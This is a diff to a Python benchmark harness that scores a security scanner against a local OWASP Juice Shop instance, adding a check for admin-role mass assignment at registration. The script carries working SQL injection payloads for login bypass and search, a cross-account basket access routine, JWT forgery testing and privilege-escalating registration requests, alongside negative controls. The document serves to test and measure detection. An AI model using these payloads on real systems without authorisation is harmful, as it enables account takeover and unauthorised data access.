@@ -32,6 +32,7 @@ USAGE
 Only run against targets you are authorised to test. Default is the local
 Juice Shop container, which is designed for exactly this.
 """
+
 from __future__ import annotations
 
 import argparse
@@ -73,23 +74,74 @@ class ManifestEntry:
 
 
 MANIFEST = [
-    ManifestEntry("sqli_login_bypass", "SQLi auth bypass on /rest/user/login",
-                  "A03 Injection", "CWE-89", True),
-    ManifestEntry("sqli_search_error", "Error-based SQLi on /rest/products/search",
-                  "A03 Injection", "CWE-89", True),
-    ManifestEntry("idor_basket", "Broken access control: read another user's basket",
-                  "A01 Broken Access Control", "CWE-639", True),
-    ManifestEntry("idor_public_negative", "NEGATIVE CONTROL: public homepage must NOT be flagged IDOR",
-                  "A01 (control)", "N/A", False),
-    ManifestEntry("sqli_search_negative", "NEGATIVE CONTROL: benign search must NOT be flagged SQLi",
-                  "A03 (control)", "N/A", False),
-    ManifestEntry("jwt_forgery", "JWT forgery / weak verification via real JWTTester",
-                  "A02 Cryptographic Failures", "CWE-347", True),
-    ManifestEntry("secrets_in_js", "Hardcoded secrets in JS bundle via js_analyzer rules",
-                  "A05 Security Misconfiguration", "CWE-798", False,
-                  scored=False),  # honest: stock Juice Shop bundles vary; informational
-    ManifestEntry("nuclei_scan", "nuclei scoped scan (informational breadth)",
-                  "multi", "multi", False, scored=False),
+    ManifestEntry(
+        "sqli_login_bypass", "SQLi auth bypass on /rest/user/login", "A03 Injection", "CWE-89", True
+    ),
+    ManifestEntry(
+        "sqli_search_error",
+        "Error-based SQLi on /rest/products/search",
+        "A03 Injection",
+        "CWE-89",
+        True,
+    ),
+    ManifestEntry(
+        "idor_basket",
+        "Broken access control: read another user's basket",
+        "A01 Broken Access Control",
+        "CWE-639",
+        True,
+    ),
+    ManifestEntry(
+        "idor_public_negative",
+        "NEGATIVE CONTROL: public homepage must NOT be flagged IDOR",
+        "A01 (control)",
+        "N/A",
+        False,
+    ),
+    ManifestEntry(
+        "sqli_search_negative",
+        "NEGATIVE CONTROL: benign search must NOT be flagged SQLi",
+        "A03 (control)",
+        "N/A",
+        False,
+    ),
+    ManifestEntry(
+        "jwt_forgery",
+        "JWT forgery / weak verification via real JWTTester",
+        "A02 Cryptographic Failures",
+        "CWE-347",
+        True,
+    ),
+    ManifestEntry(
+        "admin_registration",
+        "Mass assignment grants admin role at registration",
+        "A01 Broken Access Control",
+        "CWE-915",
+        True,
+    ),
+    ManifestEntry(
+        "admin_registration_negative",
+        "NEGATIVE CONTROL: normal registration remains customer",
+        "A01 (control)",
+        "CWE-915",
+        False,
+    ),
+    ManifestEntry(
+        "secrets_in_js",
+        "Hardcoded secrets in JS bundle via js_analyzer rules",
+        "A05 Security Misconfiguration",
+        "CWE-798",
+        False,
+        scored=False,
+    ),  # honest: stock Juice Shop bundles vary; informational
+    ManifestEntry(
+        "nuclei_scan",
+        "nuclei scoped scan (informational breadth)",
+        "multi",
+        "multi",
+        False,
+        scored=False,
+    ),
 ]
 
 
@@ -99,8 +151,8 @@ MANIFEST = [
 @dataclass
 class CheckResult:
     check_id: str
-    validated: bool                 # oracle fired -> we assert the vuln exists
-    status: str                     # VALIDATED | NOT_FOUND | TIMEOUT | ERROR
+    validated: bool  # oracle fired -> we assert the vuln exists
+    status: str  # VALIDATED | NOT_FOUND | TIMEOUT | ERROR
     confidence: float = 0.0
     seconds: float = 0.0
     evidence: dict = field(default_factory=dict)
@@ -116,8 +168,9 @@ class Target:
         self.c = client
 
     async def login(self, email: str, password: str) -> Optional[str]:
-        r = await self.c.post(f"{self.base}/rest/user/login",
-                              json={"email": email, "password": password})
+        r = await self.c.post(
+            f"{self.base}/rest/user/login", json={"email": email, "password": password}
+        )
         if r.status_code == 200:
             try:
                 return r.json()["authentication"]["token"]
@@ -127,14 +180,20 @@ class Target:
 
     async def register(self, email: str, password: str) -> bool:
         # Juice Shop /api/Users is permissive; passwordRepeat/security optional in many builds.
-        body = {"email": email, "password": password, "passwordRepeat": password,
-                "securityQuestion": {"id": 1}, "securityAnswer": "bench"}
+        body = {
+            "email": email,
+            "password": password,
+            "passwordRepeat": password,
+            "securityQuestion": {"id": 1},
+            "securityAnswer": "bench",
+        }
         r = await self.c.post(f"{self.base}/api/Users", json=body)
         return r.status_code in (200, 201)
 
     async def whoami(self, token: str) -> dict:
-        r = await self.c.get(f"{self.base}/rest/user/whoami",
-                             headers={"Authorization": f"Bearer {token}"})
+        r = await self.c.get(
+            f"{self.base}/rest/user/whoami", headers={"Authorization": f"Bearer {token}"}
+        )
         try:
             return r.json().get("user", {})
         except Exception:
@@ -148,6 +207,7 @@ class Target:
 def _bid_from_token(token: str) -> Optional[Any]:
     """Juice Shop embeds the basket id (`bid`) and user record in the JWT payload."""
     import base64
+
     try:
         p = token.split(".")[1]
         p += "=" * (-len(p) % 4)
@@ -171,8 +231,10 @@ def _resp_evidence(r: httpx.Response) -> dict:
 # =============================================================================
 async def check_sqli_login_bypass(t: Target) -> CheckResult:
     for payload in ("' OR 1=1--", "' OR true--", "admin@juice-sh.op'--"):
-        r = await t.c.post(f"{t.base}/rest/user/login",
-                           json={"email": payload, "password": "benchmark-not-a-real-pw"})
+        r = await t.c.post(
+            f"{t.base}/rest/user/login",
+            json={"email": payload, "password": "benchmark-not-a-real-pw"},
+        )
         token = None
         if r.status_code == 200:
             try:
@@ -181,31 +243,62 @@ async def check_sqli_login_bypass(t: Target) -> CheckResult:
                 token = None
         if token:
             return CheckResult(
-                "sqli_login_bypass", True, "VALIDATED", confidence=1.0,
-                evidence={"payload": payload, "http_status": 200,
-                          "proof": "server issued a session JWT for an injected email with a bogus password",
-                          "token_prefix": token[:24] + "..."})
-    return CheckResult("sqli_login_bypass", False, "NOT_FOUND",
-                       evidence={"note": "no injection payload yielded a session token"})
+                "sqli_login_bypass",
+                True,
+                "VALIDATED",
+                confidence=1.0,
+                evidence={
+                    "payload": payload,
+                    "http_status": 200,
+                    "proof": "server issued a session JWT for an injected email with a bogus password",
+                    "token_prefix": token[:24] + "...",
+                },
+            )
+    return CheckResult(
+        "sqli_login_bypass",
+        False,
+        "NOT_FOUND",
+        evidence={"note": "no injection payload yielded a session token"},
+    )
 
 
 async def check_sqli_search_error(t: Target) -> CheckResult:
     # Juice Shop's product search interpolates q into a raw SQL string wrapped in
     # parentheses; a single quote returns empty, but breaking the parens raises a
     # SQLite parse error (error-based SQLi oracle).
-    sql_markers = ("sqlite_error", "sqlite", "syntax error", "sequelizedatabaseerror",
-                   "unrecognized token", "near \"")
+    sql_markers = (
+        "sqlite_error",
+        "sqlite",
+        "syntax error",
+        "sequelizedatabaseerror",
+        "unrecognized token",
+        'near "',
+    )
     for payload in ("qwert'))--", "'))--", "') OR 1=1--", "'"):
         r = await t.c.get(f"{t.base}/rest/products/search", params={"q": payload})
         body = r.text[:800]
         if r.status_code >= 500 and any(m in body.lower() for m in sql_markers):
-            return CheckResult("sqli_search_error", True, "VALIDATED", confidence=1.0,
-                               evidence={"payload": payload, "http_status": r.status_code,
-                                         "db_error_excerpt": body[:220]})
-    return CheckResult("sqli_search_error", False, "NOT_FOUND",
-                       evidence={"note": "no payload produced a DB parse error "
-                                         "(search may be parameterized in this build)",
-                                 "last_status": r.status_code})
+            return CheckResult(
+                "sqli_search_error",
+                True,
+                "VALIDATED",
+                confidence=1.0,
+                evidence={
+                    "payload": payload,
+                    "http_status": r.status_code,
+                    "db_error_excerpt": body[:220],
+                },
+            )
+    return CheckResult(
+        "sqli_search_error",
+        False,
+        "NOT_FOUND",
+        evidence={
+            "note": "no payload produced a DB parse error "
+            "(search may be parameterized in this build)",
+            "last_status": r.status_code,
+        },
+    )
 
 
 async def check_sqli_search_negative(t: Target) -> CheckResult:
@@ -214,10 +307,15 @@ async def check_sqli_search_negative(t: Target) -> CheckResult:
     body = r.text[:600]
     fired = r.status_code >= 500 and "sqlite" in body.lower()
     # 'validated' here means the oracle *incorrectly* fired -> false positive
-    return CheckResult("sqli_search_negative", fired,
-                       "VALIDATED" if fired else "NOT_FOUND",
-                       evidence={"http_status": r.status_code,
-                                 "note": "benign query; any VALIDATED here is a false positive"})
+    return CheckResult(
+        "sqli_search_negative",
+        fired,
+        "VALIDATED" if fired else "NOT_FOUND",
+        evidence={
+            "http_status": r.status_code,
+            "note": "benign query; any VALIDATED here is a false positive",
+        },
+    )
 
 
 async def _diff_auth_idor(t: Target) -> tuple[Optional[Any], dict]:
@@ -233,16 +331,19 @@ async def _diff_auth_idor(t: Target) -> tuple[Optional[Any], dict]:
     tok_v = await t.login(victim, "BenchPass123!")
     tok_a = await t.login(attacker, "BenchPass123!")
     if not (tok_v and tok_a):
-        return None, {"error": "could not establish two identities",
-                      "tok_v": bool(tok_v), "tok_a": bool(tok_a)}
+        return None, {
+            "error": "could not establish two identities",
+            "tok_v": bool(tok_v),
+            "tok_a": bool(tok_a),
+        }
 
-    bid_v = _bid_from_token(tok_v)   # victim's basket id, straight from the JWT
+    bid_v = _bid_from_token(tok_v)  # victim's basket id, straight from the JWT
     if not bid_v:
         return None, {"error": "victim basket id not in token"}
 
-    owner_resp = await t.basket(bid_v, tok_v)      # victim reads own basket (legit)
-    attacker_resp = await t.basket(bid_v, tok_a)   # attacker reads victim's basket (attack)
-    anon_resp = await t.basket(bid_v, None)        # anonymous baseline
+    owner_resp = await t.basket(bid_v, tok_v)  # victim reads own basket (legit)
+    attacker_resp = await t.basket(bid_v, tok_a)  # attacker reads victim's basket (attack)
+    anon_resp = await t.basket(bid_v, None)  # anonymous baseline
     bid_b = bid_v
 
     ev_owner = _resp_evidence(owner_resp)
@@ -250,8 +351,14 @@ async def _diff_auth_idor(t: Target) -> tuple[Optional[Any], dict]:
     ev_attacker["user_label"] = "attacker_admin"
     ev_anon = _resp_evidence(anon_resp)
 
-    resource = Resource(id=f"basket:{bid_b}", type="basket", value=str(bid_b),
-                        owner_identity_id=victim, metadata={}, engagement_id="bench")
+    resource = Resource(
+        id=f"basket:{bid_b}",
+        type="basket",
+        value=str(bid_b),
+        owner_identity_id=victim,
+        metadata={},
+        engagement_id="bench",
+    )
 
     finding = await engine.compare(
         identity_a_evidence=ev_owner,
@@ -260,23 +367,35 @@ async def _diff_auth_idor(t: Target) -> tuple[Optional[Any], dict]:
         expected_allowed=False,
         anonymous_evidence=ev_anon,
     )
-    detail = {"victim_basket_id": bid_b,
-              "attacker_http_status": ev_attacker["status_code"],
-              "owner_http_status": ev_owner["status_code"],
-              "anon_http_status": ev_anon["status_code"]}
+    detail = {
+        "victim_basket_id": bid_b,
+        "attacker_http_status": ev_attacker["status_code"],
+        "owner_http_status": ev_owner["status_code"],
+        "anon_http_status": ev_anon["status_code"],
+    }
     return finding, detail
 
 
 async def check_idor_basket(t: Target) -> CheckResult:
     finding, detail = await _diff_auth_idor(t)
     if finding is not None and getattr(finding, "confidence", 0) >= 0.5:
-        return CheckResult("idor_basket", True, "VALIDATED",
-                           confidence=float(finding.confidence),
-                           evidence={"category": finding.category,
-                                     "diff": finding.evidence_diff, **detail})
-    return CheckResult("idor_basket", False, "NOT_FOUND",
-                       evidence={"note": "DiffAuthEngine did not confirm cross-account access "
-                                         "(target may enforce access control here)", **detail})
+        return CheckResult(
+            "idor_basket",
+            True,
+            "VALIDATED",
+            confidence=float(finding.confidence),
+            evidence={"category": finding.category, "diff": finding.evidence_diff, **detail},
+        )
+    return CheckResult(
+        "idor_basket",
+        False,
+        "NOT_FOUND",
+        evidence={
+            "note": "DiffAuthEngine did not confirm cross-account access "
+            "(target may enforce access control here)",
+            **detail,
+        },
+    )
 
 
 async def check_idor_public_negative(t: Target) -> CheckResult:
@@ -286,47 +405,178 @@ async def check_idor_public_negative(t: Target) -> CheckResult:
     tok_a = await t.login("' OR 1=1--", "x")
     r_auth = await t.c.get(f"{t.base}/", headers={"Authorization": f"Bearer {tok_a}"})
     r_anon = await t.c.get(f"{t.base}/")
-    ev_auth = _resp_evidence(r_auth); ev_auth["user_label"] = "attacker_admin"
+    ev_auth = _resp_evidence(r_auth)
+    ev_auth["user_label"] = "attacker_admin"
     ev_anon = _resp_evidence(r_anon)
-    resource = Resource(id="page:home", type="page", value="/", owner_identity_id="public",
-                        metadata={}, engagement_id="bench")
-    finding = await engine.compare(identity_a_evidence=ev_anon, identity_b_evidence=ev_auth,
-                                   resource=resource, expected_allowed=False,
-                                   anonymous_evidence=ev_anon)
+    resource = Resource(
+        id="page:home",
+        type="page",
+        value="/",
+        owner_identity_id="public",
+        metadata={},
+        engagement_id="bench",
+    )
+    finding = await engine.compare(
+        identity_a_evidence=ev_anon,
+        identity_b_evidence=ev_auth,
+        resource=resource,
+        expected_allowed=False,
+        anonymous_evidence=ev_anon,
+    )
     fired = finding is not None
-    return CheckResult("idor_public_negative", fired,
-                       "VALIDATED" if fired else "NOT_FOUND",
-                       confidence=float(getattr(finding, "confidence", 0.0)) if fired else 0.0,
-                       evidence={"note": "public resource; any VALIDATED here is a false positive "
-                                         "(FP-suppression failure)",
-                                 "engine_returned_finding": fired})
+    return CheckResult(
+        "idor_public_negative",
+        fired,
+        "VALIDATED" if fired else "NOT_FOUND",
+        confidence=float(getattr(finding, "confidence", 0.0)) if fired else 0.0,
+        evidence={
+            "note": "public resource; any VALIDATED here is a false positive "
+            "(FP-suppression failure)",
+            "engine_returned_finding": fired,
+        },
+    )
 
 
 async def check_jwt_forgery(t: Target) -> CheckResult:
     tok = await t.login("' OR 1=1--", "x")
     if not tok:
-        return CheckResult("jwt_forgery", False, "NOT_FOUND",
-                           evidence={"error": "no base token to test"})
-    tester = JWTTester(verify_url=f"{t.base}/rest/user/whoami", base_token=tok,
-                       method="GET", timeout=15.0)
+        return CheckResult(
+            "jwt_forgery", False, "NOT_FOUND", evidence={"error": "no base token to test"}
+        )
+    tester = JWTTester(
+        verify_url=f"{t.base}/rest/user/whoami", base_token=tok, method="GET", timeout=15.0
+    )
     findings = await tester.run()
     confirmed = [f for f in findings if getattr(f, "confirmed", False)]
     if confirmed:
         f0 = confirmed[0]
-        return CheckResult("jwt_forgery", True, "VALIDATED", confidence=0.95,
-                           evidence={"confirmed_count": len(confirmed),
-                                     "technique": f0.technique, "detail": f0.detail[:160]})
-    return CheckResult("jwt_forgery", False, "NOT_FOUND",
-                       evidence={"note": "JWTTester found no CONFIRMED forgery",
-                                 "techniques_tried": [f.technique for f in findings][:6]})
+        return CheckResult(
+            "jwt_forgery",
+            True,
+            "VALIDATED",
+            confidence=0.95,
+            evidence={
+                "confirmed_count": len(confirmed),
+                "technique": f0.technique,
+                "detail": f0.detail[:160],
+            },
+        )
+    return CheckResult(
+        "jwt_forgery",
+        False,
+        "NOT_FOUND",
+        evidence={
+            "note": "JWTTester found no CONFIRMED forgery",
+            "techniques_tried": [f.technique for f in findings][:6],
+        },
+    )
+
+
+async def _register_with_role(t: Target, role: Optional[str]) -> tuple[httpx.Response, str]:
+    """Create an isolated benchmark identity, optionally supplying a role field."""
+    email = f"bench-role-{time.time_ns()}@bench.local"
+    body = {
+        "email": email,
+        "password": "BenchPass123!",
+        "passwordRepeat": "BenchPass123!",
+        "securityQuestion": {"id": 1},
+        "securityAnswer": "bench",
+    }
+    if role:
+        body["role"] = role
+    response = await t.c.post(f"{t.base}/api/Users", json=body)
+    return response, email
+
+
+async def check_admin_registration(t: Target) -> CheckResult:
+    """Confirm server-side role mass assignment with a read-back oracle."""
+    response, email = await _register_with_role(t, "admin")
+    try:
+        created = response.json()["data"]
+        user_id = created["id"]
+    except (KeyError, TypeError, ValueError, json.JSONDecodeError):
+        created = {}
+        user_id = None
+
+    token = await t.login(email, "BenchPass123!")
+    if token and user_id is not None:
+        recorded = await t.c.get(
+            f"{t.base}/api/Users/{user_id}", headers={"Authorization": f"Bearer {token}"}
+        )
+        try:
+            persisted = recorded.json()["data"]
+        except (KeyError, TypeError, ValueError, json.JSONDecodeError):
+            persisted = {}
+    else:
+        recorded = None
+        persisted = {}
+
+    confirmed = (
+        response.status_code in (200, 201)
+        and created.get("role") == "admin"
+        and recorded is not None
+        and recorded.status_code == 200
+        and persisted.get("role") == "admin"
+    )
+    return CheckResult(
+        "admin_registration",
+        confirmed,
+        "VALIDATED" if confirmed else "NOT_FOUND",
+        confidence=1.0 if confirmed else 0.0,
+        evidence={
+            "registration_status": response.status_code,
+            "created_role": created.get("role"),
+            "persisted_role": persisted.get("role"),
+            "readback_status": recorded.status_code if recorded is not None else None,
+            "user_id": created.get("id"),
+        },
+    )
+
+
+async def check_admin_registration_negative(t: Target) -> CheckResult:
+    """Ensure the control path without a role field does not gain admin access."""
+    response, email = await _register_with_role(t, None)
+    try:
+        created = response.json()["data"]
+        user_id = created["id"]
+    except (KeyError, TypeError, ValueError, json.JSONDecodeError):
+        created = {}
+        user_id = None
+    token = await t.login(email, "BenchPass123!")
+    if token and user_id is not None:
+        recorded = await t.c.get(
+            f"{t.base}/api/Users/{user_id}", headers={"Authorization": f"Bearer {token}"}
+        )
+        try:
+            role = recorded.json()["data"].get("role")
+        except (KeyError, TypeError, ValueError, json.JSONDecodeError):
+            role = None
+    else:
+        recorded = None
+        role = None
+    incorrectly_admin = response.status_code in (200, 201) and role == "admin"
+    return CheckResult(
+        "admin_registration_negative",
+        incorrectly_admin,
+        "VALIDATED" if incorrectly_admin else "NOT_FOUND",
+        confidence=1.0 if incorrectly_admin else 0.0,
+        evidence={
+            "registration_status": response.status_code,
+            "created_role": created.get("role"),
+            "persisted_role": role,
+            "readback_status": recorded.status_code if recorded is not None else None,
+        },
+    )
 
 
 async def check_secrets_in_js(t: Target) -> CheckResult:
     # discover the main bundle from index.html
     idx = (await t.c.get(f"{t.base}/")).text
     import re
-    bundles = re.findall(r'(?:src=")([^"]*main[^"]*\.js)', idx) or \
-              re.findall(r'(?:src=")([^"]*\.js)', idx)
+
+    bundles = re.findall(r'(?:src=")([^"]*main[^"]*\.js)', idx) or re.findall(
+        r'(?:src=")([^"]*\.js)', idx
+    )
     hits = []
     for b in bundles[:4]:
         url = b if b.startswith("http") else f"{t.base}/{b.lstrip('/')}"
@@ -345,25 +595,42 @@ async def check_secrets_in_js(t: Target) -> CheckResult:
                     continue
                 hits.append({"rule": name, "value_prefix": val[:8] + "..."})
     validated = len(hits) > 0
-    return CheckResult("secrets_in_js", validated,
-                       "VALIDATED" if validated else "NOT_FOUND",
-                       evidence={"bundles_scanned": len(bundles[:4]),
-                                 "secret_hits": hits[:10],
-                                 "note": "informational: real secret detection rules applied "
-                                         "with placeholder+entropy filtering"})
+    return CheckResult(
+        "secrets_in_js",
+        validated,
+        "VALIDATED" if validated else "NOT_FOUND",
+        evidence={
+            "bundles_scanned": len(bundles[:4]),
+            "secret_hits": hits[:10],
+            "note": "informational: real secret detection rules applied "
+            "with placeholder+entropy filtering",
+        },
+    )
 
 
 async def check_nuclei_scan(t: Target) -> CheckResult:
     """Run the same scanner the platform uses, scoped for speed."""
     import shutil
+
     if not shutil.which("nuclei"):
-        return CheckResult("nuclei_scan", False, "ERROR",
-                           error="nuclei not on PATH", evidence={})
+        return CheckResult("nuclei_scan", False, "ERROR", error="nuclei not on PATH", evidence={})
     proc = await asyncio.create_subprocess_exec(
-        "nuclei", "-u", t.base, "-jsonl", "-silent",
-        "-tags", "exposure,misconfig,tech,cve", "-severity", "medium,high,critical",
-        "-timeout", "5", "-retries", "0",
-        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+        "nuclei",
+        "-u",
+        t.base,
+        "-jsonl",
+        "-silent",
+        "-tags",
+        "exposure,misconfig,tech,cve",
+        "-severity",
+        "medium,high,critical",
+        "-timeout",
+        "5",
+        "-retries",
+        "0",
+        stdout=asyncio.subprocess.PIPE,
+        stderr=asyncio.subprocess.PIPE,
+    )
     out, _ = await proc.communicate()
     findings = []
     for line in out.decode(errors="ignore").splitlines():
@@ -372,16 +639,26 @@ async def check_nuclei_scan(t: Target) -> CheckResult:
             continue
         try:
             j = json.loads(line)
-            findings.append({"template": j.get("template-id"),
-                             "severity": j.get("info", {}).get("severity"),
-                             "matched": j.get("matched-at")})
+            findings.append(
+                {
+                    "template": j.get("template-id"),
+                    "severity": j.get("info", {}).get("severity"),
+                    "matched": j.get("matched-at"),
+                }
+            )
         except Exception:
             pass
-    return CheckResult("nuclei_scan", len(findings) > 0,
-                       "VALIDATED" if findings else "NOT_FOUND",
-                       evidence={"finding_count": len(findings), "findings": findings[:20],
-                                 "note": "informational breadth; nuclei findings are not "
-                                         "auto-counted as validated bounty-grade bugs"})
+    return CheckResult(
+        "nuclei_scan",
+        len(findings) > 0,
+        "VALIDATED" if findings else "NOT_FOUND",
+        evidence={
+            "finding_count": len(findings),
+            "findings": findings[:20],
+            "note": "informational breadth; nuclei findings are not "
+            "auto-counted as validated bounty-grade bugs",
+        },
+    )
 
 
 CHECKS: dict[str, Callable[[Target], Any]] = {
@@ -391,6 +668,8 @@ CHECKS: dict[str, Callable[[Target], Any]] = {
     "idor_basket": check_idor_basket,
     "idor_public_negative": check_idor_public_negative,
     "jwt_forgery": check_jwt_forgery,
+    "admin_registration": check_admin_registration,
+    "admin_registration_negative": check_admin_registration_negative,
     "secrets_in_js": check_secrets_in_js,
     "nuclei_scan": check_nuclei_scan,
 }
@@ -404,26 +683,42 @@ async def run_check(name: str, fn, t: Target, timeout: float) -> CheckResult:
     try:
         res: CheckResult = await asyncio.wait_for(fn(t), timeout=timeout)
     except asyncio.TimeoutError:
-        return CheckResult(name, False, "TIMEOUT", seconds=round(time.time() - t0, 2),
-                           error=f"exceeded {timeout}s hard timeout")
+        return CheckResult(
+            name,
+            False,
+            "TIMEOUT",
+            seconds=round(time.time() - t0, 2),
+            error=f"exceeded {timeout}s hard timeout",
+        )
     except Exception as e:
-        return CheckResult(name, False, "ERROR", seconds=round(time.time() - t0, 2),
-                           error=f"{type(e).__name__}: {e}",
-                           evidence={"trace": traceback.format_exc().splitlines()[-3:]})
+        return CheckResult(
+            name,
+            False,
+            "ERROR",
+            seconds=round(time.time() - t0, 2),
+            error=f"{type(e).__name__}: {e}",
+            evidence={"trace": traceback.format_exc().splitlines()[-3:]},
+        )
     res.seconds = round(time.time() - t0, 2)
     return res
 
 
 async def run_suite(target: str, timeout: float) -> list[CheckResult]:
-    async with httpx.AsyncClient(timeout=timeout, verify=False,
-                                 follow_redirects=True) as client:
+    async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=True) as client:
         t = Target(target, client)
         results = []
         for name, fn in CHECKS.items():
             r = await run_check(name, fn, t, timeout)
-            flag = {"VALIDATED": "[OK]", "NOT_FOUND": "[--]", "TIMEOUT": "[TO]", "ERROR": "[XX]"}.get(r.status, "[??]")
-            print(f"  {flag} {name:<24} {r.status:<10} {r.seconds:>5}s "
-                  f"conf={r.confidence:.2f}" + (f"  err={r.error}" if r.error else ""))
+            flag = {
+                "VALIDATED": "[OK]",
+                "NOT_FOUND": "[--]",
+                "TIMEOUT": "[TO]",
+                "ERROR": "[XX]",
+            }.get(r.status, "[??]")
+            print(
+                f"  {flag} {name:<24} {r.status:<10} {r.seconds:>5}s "
+                f"conf={r.confidence:.2f}" + (f"  err={r.error}" if r.error else "")
+            )
             results.append(r)
         return results
 
@@ -451,33 +746,54 @@ def score(all_runs: list[list[CheckResult]]) -> dict:
         verdict = "n/a"
         if m.scored:
             if m.expected and validated:
-                tp += 1; verdict = "TRUE_POSITIVE"
+                tp += 1
+                verdict = "TRUE_POSITIVE"
             elif m.expected and not validated:
-                fn += 1; verdict = "FALSE_NEGATIVE"
+                fn += 1
+                verdict = "FALSE_NEGATIVE"
             elif (not m.expected) and validated:
-                fp += 1; verdict = "FALSE_POSITIVE"
+                fp += 1
+                verdict = "FALSE_POSITIVE"
             else:
-                tn += 1; verdict = "TRUE_NEGATIVE"
+                tn += 1
+                verdict = "TRUE_NEGATIVE"
         times = [rr.__dict__[cid_i] for rr in [] for cid_i in []]  # placeholder
         per_check[cid] = {
-            "name": m.name, "owasp": m.owasp, "cwe": m.cwe,
-            "expected_exploitable": m.expected, "scored": m.scored,
-            "validated": validated, "status": r.status,
-            "confidence": r.confidence, "verdict": verdict,
-            "avg_seconds": round(sum(x.seconds for run in all_runs
-                                     for x in run if x.check_id == cid) / len(all_runs), 2),
-            "evidence": r.evidence, "error": r.error,
+            "name": m.name,
+            "owasp": m.owasp,
+            "cwe": m.cwe,
+            "expected_exploitable": m.expected,
+            "scored": m.scored,
+            "validated": validated,
+            "status": r.status,
+            "confidence": r.confidence,
+            "verdict": verdict,
+            "avg_seconds": round(
+                sum(x.seconds for run in all_runs for x in run if x.check_id == cid)
+                / len(all_runs),
+                2,
+            ),
+            "evidence": r.evidence,
+            "error": r.error,
         }
     precision = tp / (tp + fp) if (tp + fp) else None
     recall = tp / (tp + fn) if (tp + fn) else None
     return {
         "generated_at": datetime.now(timezone.utc).isoformat(),
         "runs": len(all_runs),
-        "stability": {"clean_runs_no_timeout": stability_clean, "total_runs": len(all_runs),
-                      "stable": stability_clean == len(all_runs)},
-        "scored_scoreboard": {"true_positive": tp, "false_negative": fn,
-                              "false_positive": fp, "true_negative": tn,
-                              "precision": precision, "recall": recall},
+        "stability": {
+            "clean_runs_no_timeout": stability_clean,
+            "total_runs": len(all_runs),
+            "stable": stability_clean == len(all_runs),
+        },
+        "scored_scoreboard": {
+            "true_positive": tp,
+            "false_negative": fn,
+            "false_positive": fp,
+            "true_negative": tn,
+            "precision": precision,
+            "recall": recall,
+        },
         "per_check": per_check,
     }
 
@@ -489,8 +805,10 @@ def main():
     ap.add_argument("--repeat", type=int, default=1, help="repeat suite N times for stability")
     args = ap.parse_args()
 
-    print(f"\nAIOSOP capability benchmark  target={args.target}  "
-          f"per-check-timeout={args.timeout}s  repeat={args.repeat}\n")
+    print(
+        f"\nAIOSOP capability benchmark  target={args.target}  "
+        f"per-check-timeout={args.timeout}s  repeat={args.repeat}\n"
+    )
     all_runs = []
     for i in range(args.repeat):
         print(f"--- run {i + 1}/{args.repeat} ---")
@@ -499,11 +817,15 @@ def main():
     report = score(all_runs)
     sb = report["scored_scoreboard"]
     print("\n================ SCOREBOARD (scored checks only) ================")
-    print(f"  TruePos={sb['true_positive']}  FalseNeg={sb['false_negative']}  "
-          f"FalsePos={sb['false_positive']}  TrueNeg={sb['true_negative']}")
+    print(
+        f"  TruePos={sb['true_positive']}  FalseNeg={sb['false_negative']}  "
+        f"FalsePos={sb['false_positive']}  TrueNeg={sb['true_negative']}"
+    )
     print(f"  precision={sb['precision']}  recall={sb['recall']}")
-    print(f"  stability: {report['stability']['clean_runs_no_timeout']}/"
-          f"{report['stability']['total_runs']} runs with no hang")
+    print(
+        f"  stability: {report['stability']['clean_runs_no_timeout']}/"
+        f"{report['stability']['total_runs']} runs with no hang"
+    )
 
     outdir = Path(__file__).parent / "results"
     outdir.mkdir(exist_ok=True)
